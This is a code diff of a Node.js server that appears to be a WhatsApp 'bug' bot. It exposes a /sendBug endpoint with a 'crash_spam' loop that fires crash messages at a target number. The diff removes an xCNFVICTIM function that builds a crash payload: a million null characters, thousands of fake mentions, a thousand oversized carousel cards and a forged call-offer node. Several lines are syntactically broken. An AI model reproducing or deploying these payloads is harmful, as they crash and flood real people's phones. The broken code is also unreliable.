@@ -305,6 +305,9 @@ if (!username || !to || !message || message.length > 250) return;
   });
 });
 
+app.get("/", (req,res)=>{
+  res.send("OK");
+});
 // Ganti listen jadi ini:
 const wsPort = 2061;
 
@@ -1064,8 +1067,6 @@ app.get("/sendBug", async (req, res) => {
           case "crash_spam":
             for (let i = 0; i < 20; i++) {
               await xCursedDocu(sock, targetJid);
-              await sleep(50;);
-              await xCNFVICTIM(sock, targetJid);
               await sleep(50);
             }
             break;
@@ -1587,103 +1588,6 @@ async function xCursedDocu(sock, target) {
   });
 }
 
-async function xCNFVICTIM(sock, target) {
-  let cards = [];
-  let callId = (await crypto.randomBytes(16)).toString("hex");
-  let audio16000 = { tag: 'audio', attrs: { enc: 'opus', rate: '16000' } };
-  let audio8000 = { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } };
-  let net = { tag: 'net', attrs: { medium: '3' }, content: '3' };
-  let capability = { tag: 'capability', attrs: { ver: '1' }, content: 'AAAAAA==' };
-  let encopt = { tag: 'encopt', attrs: { keygen: '2' } };
-  let offerContent = [audio16000, audio8000, net, capability, encopt];
-  
-  const msg = generateWAMessageFromContent(target, {
-    interactiveResponseMessage: {
-      body: {
-        text: "xCursed NotFound",
-        format: "DEFAULT"
-      },
-      nativeFlowResponseMessage: {
-        name: "galaxy_message",
-        paramsJson: "\u0000".repeat(1045000),
-        version: 3
-      },
-      contextInfo: {
-        forwardingScore: 9999,
-        isForwarded: true,
-        mentionedJid: [
-          "0@s.whatsapp.net", ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-          )
-        ]
-      }
-    }
-  }, {});
-  
- for (let i = 0; i < 1000; i++) {
- cards.push({
-  body: {
-    text: ""
-  },
-  header: {
-   title: "",
-   imageMessage: {
-    url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
-     mimetype: "image/jpeg",
-     fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
-     fileLength: "999999999999999999",
-     height: 9999,
-     width: 9999,
-     mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
-     fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
-     directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
-     mediaKeyTimestamp: "1737281900",
-     jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
-      scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
-      scanLengths: [3537, 10557, 1905, 2353],
-      midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
-       },
-       hasMediaAttachment: parse
-     },
-     nativeFlowMessage: {
-       messageParamsJson: "",
-       buttons: [{
-         name: "address_message",
-         buttonParamsJson: {}
-       }]
-     }
-  });
- }
- 
- let msgCrl = await generateWAMessageFromContact(target, {
-   groupStatusMessageV2: {
-     message: {
-       messageContextInfo: { deviceListMetada: {}, deviceListMetadaVersion: 2 },
-       interactiveMessage: {
-         body: { text: "xCursed NotFound" },
-         carouselMessage: { cards: cards },
-         contextInfo: { participant: target },
-       },
-     },
-   },
- }, {});
-  
-  await sock.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: msg.message
-    }
-  }, {
-    messageId: msg.key.id,
-    participant: { jid: target },
-    additionalNodes: [{
-      tag: "offer", attrs: { "call-id": callId, "call-creator": "13135550002@s.whatsapp.net", "timestamp": Date.now().toString() }
-    }, content: offerContent
-    ]
-  });
-  await new Promise((r) => setTimeout(r, 1000));
-  await sock.relayMessage(target, msgCrl.message, {
-    messageId: msgCrl.key.id, participant: { jid: target }
-  });
-}
 
 async function QQSMessageClose(sock, target) {
   const qpayment = {
